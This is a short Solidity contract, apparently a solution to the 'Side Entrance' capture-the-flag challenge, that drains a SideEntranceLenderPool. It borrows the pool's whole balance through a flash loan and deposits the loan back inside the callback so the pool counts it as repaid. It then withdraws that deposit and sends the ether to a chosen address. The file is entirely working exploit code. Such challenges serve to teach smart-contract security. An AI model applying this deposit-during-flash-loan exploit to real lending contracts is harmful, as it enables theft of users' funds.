// SPDX-Liciense-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Solve {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack(address payable _to) external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        _to.transfer(address(this).balance);
    }

    receive() external payable {}

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
